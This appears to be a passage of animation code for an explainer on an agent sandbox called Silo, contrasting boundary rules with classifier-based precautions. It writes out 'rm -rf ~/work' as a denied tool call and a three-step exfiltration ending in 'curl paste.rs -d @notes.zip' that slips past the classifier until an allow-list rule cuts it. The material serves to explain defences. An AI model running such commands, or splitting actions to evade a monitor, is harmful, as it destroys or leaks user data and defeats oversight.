    gLow.textContent = "low";
    Object.entries({ x: gx0 + gW + 10, fill: K.tone("ink"), "font-weight": 600, opacity: 0 }).forEach(([k, v]) => gLow.setAttribute(k, v));
    gauge5.appendChild(gLow);
    const gMark5 = K.text(gauge5._x + gauge5.w / 2 + 14, 175, "fact", { size: 14, mono: true, color: "muted", anchor: "start" });
    const rule5 = rule(xcA, 320, "when memory is low:", "pause", { sub: "pause main, alert" });
    const you5 = K.actor(xcA, 498, "you", "you", { tone: "you" });
    const meter5 = K.link(gauge5, rule5, { tone: "ink", from: "bottom", to: "top" });
    const pauseA5 = K.link(rule5, A5.r, { tone: "ink", from: "left", to: "right" });
    const pauseChipA5 = K.chip(0, 0, "pause", { tone: "ink", size: 14 });
    const alertA5 = K.link(rule5, you5, { tone: "ink", from: "bottom", to: "top" });
    const alertChip5 = K.chip(0, 0, "alert", { tone: "warn", icon: "bell", size: 15 });
    // Right, a precaution on an opinion that comes after the thing has passed.
    const recP5 = K.window(xcB, 180, "The record", { w: COL, icon: "list" });
    const rowP5 = fact(recP5, "connection");
    const clsP5 = K.card(xcB, 320, "small model", { sub: "a classifier", icon: "model", w: 200 });
    const [opP5, opP5Who] = opinion(xcB, 405, "working against you?", "small model");
    const precP5 = fitCol(precaution(0, 0, "on that opinion: pause main"));
    place(precP5, xcB, 530);
    const toRecP5 = K.link({ x: P5.a.at("top").x + 14, y: B4 - 8 }, recP5, { tone: "ink", to: "left" });
    const readP5 = K.link(recP5, clsP5, { tone: "muted", dashed: true });
    const opToP5 = K.link(opP5Who, precP5, { tone: "accent" });
    const pauseChipP5 = K.chip(0, 0, "pause", { tone: "ink", size: 14 });
    const actP5 = K.link(precP5, P5.r, { tone: "ink", from: "left", to: "right" });
    const nothing5 = K.text(640, 625, "nothing waits, so nothing is allowed, held or denied", { size: 17, color: "muted" });
    const kinds5 = K.text(640, 652, "rule: any kind · precaution: reversible only", { size: 17, color: "muted" });

    // 5. Nothing stands at a boundary. Left: the meter fills to "low", a fact; its link reaches the rule card, the card
    //    lights, main is paused and the alert travels to you. Right: the connection passes and lands in the record;
    //    afterwards the classifier reads it, its opinion reaches the precaution card, and only then does the pause leave it.
    //    Hero: the two paused computers, one by a rule on a fact, one by a precaution on an opinion.
    scene(4);
    K.hide([A4.r, A4.a, ...A4.p, A4.h, A4.lk, A4.c, P4.r, P4.a, ...P4.p, P4.h, P4.lk, P4.c, head4, titleA4, titleP4, sep4, rule4, spot4, counted4, actA4,
            clsP4, opP4, opP4Who, precP4, readP4, opToP4, actP4, denyP4, kinds4], { at: 0 });
    K.appear([A5.r, P5.r], { from: "fade", at: 0.2 });
    K.appear([A5.a, P5.a], { from: "pop", at: "<0.2" });
    K.appear([...A5.p, ...P5.p, P5.h], { at: "<0.2", stagger: 0.06 });
    K.draw(sep5, { at: 0.3, dur: 0.6 });
    K.appear(head5, { from: "fade", at: V.word(4, 0, "Asynchronous") });
    K.appear([titleA5, titleP5], { from: "fade", stagger: 0.15, at: "<0.3" });
    K.appear([recP5, clsP5, precP5], { at: V.end(4, 0) - 0.4, stagger: 0.08 });
    K.appear(rule5, { at: V.word(4, 1, "A rule") });
    K.appear(you5, { from: "pop", at: "<0.2" });
    const tG = V.word(4, 1, "the memory of the Mac");
    K.appear(gauge5, { at: tG - 0.2 });
    const tLow = Math.max(V.word(4, 1, "runs low"), tG + 1);
    tl.to(gFill, { attr: { width: gW * 0.93 }, duration: tLow - tG + 0.2, ease: "power1.in" }, T(4, tG + 0.2));
    tl.to(gFill, { fill: K.tone("ink"), duration: 0.3 }, T(4, tLow + 0.1));
    tl.to(gLow, { opacity: 1, duration: 0.3, ease: "power2.out" }, T(4, tLow + 0.2));
    const tFact = Math.max(V.word(4, 2, "is a fact"), tLow + 0.6);
    K.appear(gMark5, { from: "fade", at: tFact });
    K.draw(meter5, { at: tFact + 0.2, dur: 0.5 });
    K.glow(rule5, { tone: "ink", at: tFact + 0.75 });                  // the meter's link has reached the rule
    const tPA = Math.max(V.word(4, 2, "pauses main") - 0.4, tFact + 1.1);
    K.draw(pauseA5, { at: tPA, dur: 0.4 });
    K.travel(pauseChipA5, pauseA5, { land: "absorb", dur: 0.5, at: tPA + 0.3 });
    pause(A5.r, [A5.a, ...A5.p], 4, tPA + 0.8);
    K.draw(alertA5, { at: Math.max(V.word(4, 2, "alerts you") - 0.3, tPA + 1.1), dur: 0.5 });
    K.travel(alertChip5, alertA5, { land: "dock", dur: 0.7, at: ">-0.1" });
    const tA = V.at(4, 3);
    K.draw(P5.lk, { at: tA - 0.2, dur: 0.6 });
    K.travel(P5.c, P5.lk, { dur: 0.8, at: tA });
    K.draw(toRecP5, { at: tA + 0.7, dur: 0.5 });
    K.appear(rowP5, { from: "fade", at: tA + 1.15, dur: 0.4 });
    markPulse(rowP5, T(4, tA + 1.6));
    const tReadP5 = Math.max(V.word(4, 3, "a classifier's opinion"), tA + 1.7);
    K.draw(readP5, { at: tReadP5, dur: 0.5 });
    K.pulse(clsP5, { tone: "accent", at: tReadP5 + 0.45 });
    K.appear([opP5, opP5Who], { from: "right", at: tReadP5 + 0.6, dur: 0.4 });
    K.draw(opToP5, { at: tReadP5 + 0.9, dur: 0.5 });
    K.pulse(precP5, { tone: "accent", at: tReadP5 + 1.35 });           // the opinion's link has reached the card
    const tPP = Math.max(V.word(4, 3, "pauses main") - 0.4, tReadP5 + 1.5);
    K.draw(actP5, { at: tPP, dur: 0.5 });                              // only now does the pause leave it
    K.travel(pauseChipP5, actP5, { land: "absorb", dur: 0.6, at: tPP + 0.35 });
    pause(P5.r, [P5.a, ...P5.p], 4, tPP + 0.9);
    K.appear(nothing5, { from: "fade", at: Math.max(V.at(4, 4), tPP + 1.2) });
    K.appear(kinds5, { from: "fade", at: Math.max(V.word(4, 4, "a rule may trigger"), tPP + 1.6) });
    run(A5.p, 4, 0.4, tPA + 0.8);
    run(P5.p, 4, 0.4, tPP + 0.9);

    // ---------- 6 and 7. A classifier on each tool call. The model outside; main below, its top edge the boundary. ----------
    const B5 = 310;
    const model5 = K.card(355, 92, "model", { icon: "model", w: 200 });
    const main5 = computer(355, 480, 570, 340);              // x 70..640, y 310..650
    const prog5 = K.card(355, 585, "agent program", { icon: "agent", w: 240 });
    const reply5 = K.doc(355, 238, "reply", { w: 360, h: 125 });
    const call5 = reply5.line("rm -rf ~/work");
    const call5b = reply5.line("A classifier thinks it is not safe.");
    const cls5 = K.card(1030, 100, "small model", { sub: "a classifier", icon: "model", w: 200 });
    const [op5, op5Who] = opinion(1030, 190, "not safe", "small model");
    const prec5 = K.window(1000, 372, "precaution", { w: 300, icon: "shield" });
    prec5.box.setAttribute("stroke", K.tone("faint"));
    prec5.box.setAttribute("stroke-dasharray", "5 5");
    prec5.box.setAttribute("stroke-width", 1.25);
    const pr = ["safe: does nothing", "unsure: hold for you", "not safe: deny"].map(s => prec5.row(s));
    const record5 = K.window(950, 582, "The record", { w: 540, icon: "list" });
    const ro1 = fact(record5, "tool call  rm -rf ~/work  (original)");
    const ro2 = fact(record5, "tool call  refusal  (sent instead)");
    const down5 = K.link(model5, prog5, { tone: "ink", from: "bottom", to: "top" });
    const d0 = down5.path.getPointAtLength(0).y, d1 = down5.path.getPointAtLength(down5.len).y, f5 = (B5 - d0) / (d1 - d0);
    const read5 = K.link(reply5, cls5, { tone: "muted", dashed: true, from: "right", to: "left" });
    const rm5 = read5.path.getPointAtLength(read5.len * 0.5);
    const timer5 = K.icon(rm5.x, rm5.y, "timer", { size: 24, tone: "ink" });
    const limit5 = K.text(rm5.x + 24, rm5.y + 26, "Silo's limit", { size: 15, color: "muted", anchor: "start" });
    const opTo5 = K.link(op5Who, prec5, { tone: "accent" });
    const deny5 = K.link(pr[2], reply5, { tone: "ink" });
    const back5 = K.link(prog5, model5, { tone: "ink", from: "right", to: "right", bend: 0.7 });
    const refusal5 = K.chip(0, 0, "refusal", { tone: "ink", icon: "message", size: 15 });
    const changed6 = K.text(372, 290, "changed here", { size: 16, color: "accent", anchor: "start" });
    const reads6 = K.text(372, 200, "Silo reads this traffic", { size: 16, color: "accent", anchor: "start" });
    // The part of the model's link above the boundary, lit: the traffic Silo reads.
    const lit6 = svg("path", { d: down5._d, fill: "none", stroke: K.tone("accent"), "stroke-width": 3, "stroke-linecap": "round", opacity: 0 }, down5);
    // A line of the precaution card lights for a moment as the voice names it.
    const flash = (row, s, t, hold) => {
      const o = svg("rect", { x: -row.w / 2, y: -row.h / 2, width: row.w, height: row.h, rx: 9, fill: "none", stroke: K.tone("accent"), "stroke-width": 1.5, opacity: 0 }, row);
      tl.to(o, { opacity: 0.9, duration: 0.3, ease: "power2.out" }, T(s, t));
      tl.to(o, { opacity: 0, duration: 0.4, ease: "power2.in" }, T(s, t + hold));
    };

    // 6. A reply comes from the model and stops at the boundary, a tool call inside it. The classifier looks at it; the
    //    wait has Silo's limit. The precaution's first two lines light as the voice names them. Nothing is decided yet.
    //    Hero: the reply waiting at the boundary, with the three lines of the precaution.
    scene(5);
    K.hide([A5.r, A5.a, ...A5.p, P5.r, P5.a, ...P5.p, P5.h, P5.lk, P5.c, head5, titleA5, titleP5, sep5, gauge5, gMark5, rule5, you5, meter5, pauseA5,
            pauseChipA5, alertA5, alertChip5, recP5, rowP5, clsP5, opP5, opP5Who, precP5, toRecP5, readP5, opToP5, pauseChipP5, actP5, nothing5, kinds5], { at: 0 });
    K.appear(model5, { at: 0.3 });
    K.appear(main5, { from: "fade", at: "<0.2" });
    K.appear(prog5, { at: "<0.2" });
    drawTo(down5, 5, V.word(5, 0, "A model's reply"), f5);
    K.appear(reply5, { from: "above", at: V.word(5, 0, "A model's reply") + 0.2 });
    K.appear(call5, { from: "fade", at: V.word(5, 0, "a tool call") - 0.3 });
    K.pulse(call5, { tone: "ink", at: V.word(5, 0, "a tool call") });
    K.pulse(reply5, { tone: "ink", at: V.word(5, 1, "waits at the boundary") });
    K.appear(cls5, { at: V.word(5, 1, "for a classifier") - 0.3 });
    K.draw(read5, { at: "<0.2" });
    K.appear(timer5, { from: "pop", at: V.word(5, 2, "a limit") });
    K.appear(limit5, { from: "fade", at: "<0.1" });
    K.pulse(timer5, { tone: "ink", at: V.word(5, 2, "ends it itself") });
    K.appear(prec5, { at: V.at(5, 3) - 0.3 });
    K.appear(pr, { from: "fade", stagger: 0.1, at: "<0.3" });
    flash(pr[0], 5, V.word(5, 3, "is safe"), 1.6);
    flash(pr[1], 5, V.word(5, 4, "is unsure"), 2.0);

    // 7. The same picture. "not safe" reaches the precaution card and its third line stays lit; only then does the deny
    //    leave the card. The tool call in the reply is replaced, "changed here" stays at the boundary, and the reply goes
    //    on to the agent program, which sends the refusal back; it parks before the model. Two rows land. Last, the
    //    model's link above the boundary lights: Silo reads it there. Hero: the reply changing at the boundary.
    scene(6);
    const tOp5 = V.word(6, 0, "not safe") - 0.3;
    K.pulse(cls5, { tone: "accent", at: tOp5 - 0.2 });
    K.appear([op5, op5Who], { from: "below", at: tOp5, dur: 0.5 });
    K.draw(opTo5, { at: tOp5 + 0.35, dur: 0.5 });
    K.glow(pr[2], { tone: "accent", at: tOp5 + 0.8 });                 // the opinion's link has reached the card
    K.dim([timer5, limit5], { to: 0.4, at: tOp5 + 0.8 });
    const tDeny5 = Math.max(V.word(6, 1, "denies the call") - 0.2, tOp5 + 1.1);
    K.draw(deny5, { at: tDeny5, dur: 0.6 });                            // only now does the deny leave it
    K.pulse(reply5, { tone: "ink", at: tDeny5 + 0.55 });
    const tSwap = Math.max(V.word(6, 1, "replaced by a refusal") - 0.4, tDeny5 + 1);
    K.relabel(call5, "Silo denied this tool call.", { at: tSwap });
    K.appear(call5b, { from: "fade", at: tSwap + 0.2 });
    const tGo = Math.max(V.end(6, 1) - 0.2, tSwap + 0.8);
    K.hide([deny5, read5, timer5, limit5], { at: tGo });                // the wait is over
    onward(down5, 6, tGo + 0.1);
    K.moveTo(reply5, 355, 430, { dur: 1, at: tGo + 0.2 });
    K.appear(changed6, { from: "fade", at: tGo + 0.6 });
    K.draw(back5, { at: Math.max(V.word(6, 2, "sends the refusal back") - 0.4, tGo + 1.3) });
    K.travel(refusal5, back5, { land: "dock", dur: 1.4, at: ">-0.1" });
    K.pulse(model5, { tone: "ink", at: Math.max(V.word(6, 2, "the model reads it"), tGo + 2.9) });
    const tRec5 = V.at(6, 3) - 0.2;
    K.appear(record5, { at: tRec5 });
    const tRo1 = Math.max(V.word(6, 3, "The original"), tRec5 + 0.4), tRo2 = Math.max(V.word(6, 3, "the replacement"), tRo1 + 0.5);
    K.appear(ro1, { from: "fade", at: tRo1 });
    K.appear(ro2, { from: "fade", at: tRo2 });
    markPulse(ro1, T(6, Math.max(V.word(6, 3, "kept as facts"), tRo2 + 0.6)));
    markPulse(ro2, T(6, Math.max(V.word(6, 3, "kept as facts"), tRo2 + 0.6) + 0.15));
    const tLit = V.word(6, 4, "the model's traffic") - 0.2;
    tl.set(lit6, { opacity: 1 }, T(6, tLit));
    tl.fromTo(lit6, { drawSVG: "0% 0%" }, { drawSVG: `0% ${f5 * 100}%`, duration: 0.6, ease: "power2.inOut", immediateRender: false }, T(6, tLit));
    K.appear(reads6, { from: "fade", at: tLit + 0.3 });
    K.pulse(prog5, { tone: "ink", at: V.word(6, 5, "each agent program") });

    // ---------- 8. Three innocent steps pass the classifier; the rule at the boundary cuts the last. ----------
    const E7 = 840;
    const main7 = computer(640, 290, 400, 360);              // x 440..840, y 110..470
    const calls7 = ["write notes.txt", "zip notes.txt", "curl paste.rs -d @notes.zip"]
      .map(s => K.chip(0, 0, s, { tone: "ink", icon: "command", mono: true, size: 14 }));
    calls7.forEach(c => place(c, 70 + c.w / 2, 170));
    const cls7 = K.card(230, 290, "small model", { sub: "a classifier", icon: "model", w: 200 });
    const [op7, op7Who] = opinion(230, 375, "safe", "small model");
    const prec7 = precaution(230, 495, "precaution");
    const nothing7 = K.text(230, 548, "does nothing", { size: 15, color: "muted" });
    const opTo7 = K.link(op7Who, prec7, { tone: "accent" });
    const XS = 470 + calls7[2].w + 8;                       // where the last step's connection leaves
    const allow7 = rule(0, 400, "Allow: crates.io", "check", { w: 230 });
    place(allow7, E7 + 22 + allow7.w / 2, 400);
    const noRule7 = K.text(allow7._x, 452, "no rule allows paste.rs", { size: 16, color: "muted" });
    const paste7 = K.card(1135, 315, "paste.rs", { icon: "globe", w: 160 });
    const conn7 = K.link({ x: XS, y: 315 }, paste7, { tone: "ink", to: "left" });
    const fE = (E7 - XS) / (paste7.at("left").x - 9 - XS);    // the fraction of the connection that lies inside main
    const wPromise = K.text(allow7._x, 530, "promise", { size: 32, weight: 700, color: "accent" });
    const wExtra = K.text(230, 610, "extra caution", { size: 32, weight: 700, color: "muted" });

    // 8. Each step waits at the edge, the classifier reads it and says "safe", the opinion reaches the precaution, which
    //    does nothing, and the step goes in. The last one reaches the boundary as a connection toward paste.rs, and the
    //    rule cuts it there. Then the two words. Hero: the cut at the boundary, after the precaution denied none.
    scene(7);
    K.hide([model5, main5, prog5, reply5, call5, call5b, cls5, op5, op5Who, prec5, ...pr, record5, ro1, ro2, down5, read5, timer5, limit5,
            opTo5, deny5, back5, refusal5, changed6, reads6], { at: 0 });
    K.appear(main7, { from: "fade", at: 0.1 });
    K.appear([cls7, prec7], { at: "<0.2", stagger: 0.1 });
    K.appear([allow7, paste7], { at: "<0.2", stagger: 0.1 });
    const t7 = V.at(7, 0), d7 = Math.max(1.75, (V.end(7, 0) - t7) / 3);
    let tIn = 0;
    calls7.forEach((c, i) => {
      const t = t7 + i * d7;
      K.appear(c, { from: "left", at: t, dur: 0.4 });
      K.moveTo(c, 440 - 12 - c.w / 2, 170, { dur: 0.5, at: t + 0.2 });
      K.pulse(cls7, { tone: "accent", at: t + 0.65 });
      if (i === 0) {
        K.appear([op7, op7Who], { from: "pop", at: t + 0.75, dur: 0.4 });
        K.draw(opTo7, { at: t + 0.95, dur: 0.4 });
        K.appear(nothing7, { from: "fade", at: t + 1.35 });
        tIn = t + 1.4;
      } else {
        K.pulse(op7, { tone: "accent", at: t + 0.75 });
        tIn = t + 1.05;
      }
      K.moveTo(c, 470 + c.w / 2, 170 + i * 72, { dur: 0.55, at: tIn });
    });
    const tConn = Math.max(V.at(7, 1), tIn + 0.6);
    drawTo(conn7, 7, tConn, fE, 0.5);
    K.appear(noRule7, { from: "fade", at: tConn + 0.3 });
    K.pulse(allow7, { tone: "ink", at: tConn + 0.3 });
    const tCut7 = Math.max(V.word(7, 1, "got around"), tConn + 0.8);
    cutAt(conn7, 7, tCut7, fE);
    K.appear(wPromise, { from: "fade", at: Math.max(V.word(7, 2, "the promise"), tCut7 + 0.6) });
    K.appear(wExtra, { from: "fade", at: Math.max(V.word(7, 2, "extra caution"), tCut7 + 1.2) });
  },
});
